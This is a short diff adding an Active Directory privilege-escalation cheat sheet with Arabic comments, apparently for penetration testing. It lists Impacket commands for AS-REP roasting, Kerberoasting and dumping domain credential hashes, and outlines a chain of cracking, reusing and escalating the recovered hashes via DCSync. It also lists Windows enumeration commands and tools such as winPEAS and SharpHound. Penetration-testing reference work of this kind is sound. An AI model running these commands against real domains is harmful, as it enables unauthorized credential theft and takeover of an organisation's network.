@@ -1,0 +1,9 @@
+# LDAP/AD PrivEsc (389/636)
+# هجمات Kerberos (بعد وجود مستخدم/دومين):
+GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc_ip> -no-pass      # AS-REP Roast
+GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request             # Kerberoast
+# بعد الحصول على Hashes: crack → reuse → PrivEsc (DCSync/Local Admin)
+secretsdump.py <domain>/<user>:<pass>@<dc_ip>                             # Dump (لو امتيازات)
+# محليًا على ويندوز:
+whoami /priv; schtasks /query /fo LIST /v; sc qc <service>; icacls <path> # صلاحيات/خدمات
+# أدوات: winPEAS, Seatbelt, PowerUp, SharpHound
